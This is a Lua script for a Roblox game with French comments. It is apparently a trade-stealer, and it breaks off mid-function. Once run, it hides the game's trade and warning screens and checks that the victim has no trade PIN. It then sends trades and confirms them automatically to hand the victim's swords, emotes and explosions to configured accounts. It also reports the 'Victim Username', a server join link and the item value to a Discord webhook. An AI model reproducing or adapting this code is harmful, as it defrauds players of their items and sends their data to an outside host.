
-- =============================================
-- NE RIEN MODIFIER EN DESSOUS DE CETTE LIGNE
-- =============================================

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Vérifications initiales
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

if next(_G.Usernames) == nil or _G.webhook_toi == "" then
    plr:kick("Erreur: Username ou webhook_toi non configuré.")
    return
end
if game.PlaceId ~= 13772394625 then
    plr:kick("Ce script ne fonctionne que sur le serveur normal.")
    return
end
if #Players:GetPlayers() >= 16 then
    plr:Kick("Le serveur est plein. Rejoins un serveur moins peuplé.")
    return
end
if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Erreur de serveur. Rejoins un serveur DIFFÉRENT.")
    return
end

-- Variables et Services
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Désactiver les GUIs du jeu
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

-- Vérification du PIN de trade
local args = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Erreur de compte. Veuillez désactiver le PIN de trade et réessayer.")
    return
end

-- Fonctions de trading
local function sendTradeRequest(user)
    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
    repeat wait(0.1) local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args)) until response == true
end
local function addItemToTrade(itemType, ID)
    local args = { [1] = itemType, [2] = ID }
    repeat local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args)) until response == true
end
local function readyTrade()
    local args = { [1] = true }
    repeat wait(0.1) local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args)) until response == true
end
local function confirmTrade()
    repeat wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
end

-- Fonctions utilitaires
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do number = number / 1000 suffixIndex = suffixIndex + 1 end
    if suffixIndex == 1 then return tostring(math.floor(number))
    else if number == math.floor(number) then return string.format("%d%s", number, suffixes[suffixIndex]) else return string.format("%.2f%s", number, suffixes[suffixIndex]) end end
end

-- Fonctions d'envoi vers Discord (Modifiées pour le double webhook et la couleur)
local function SendJoinMessage(list, prefix, webhookUrl)
    if not webhookUrl or webhookUrl == "" then return end
    local fields = {
        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
        { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
        { name = "Item list 📝:", value = "", inline = false },
        { name = "Summary 💰:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false }
    }
    local grouped = {}
    for _, item in ipairs(list) do if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP else grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP } end end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
    for _, group in ipairs(groupedList) do local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP)) fields[3].value = fields[3].value .. itemLine .. "\n" end
    if #fields[3].value > 1024 then local lines = {} for line in fields[3].value:gmatch("[^^\r\n]+") do table.insert(lines, line) end while #fields[3].value > 1024 and #lines > 0 do table.remove
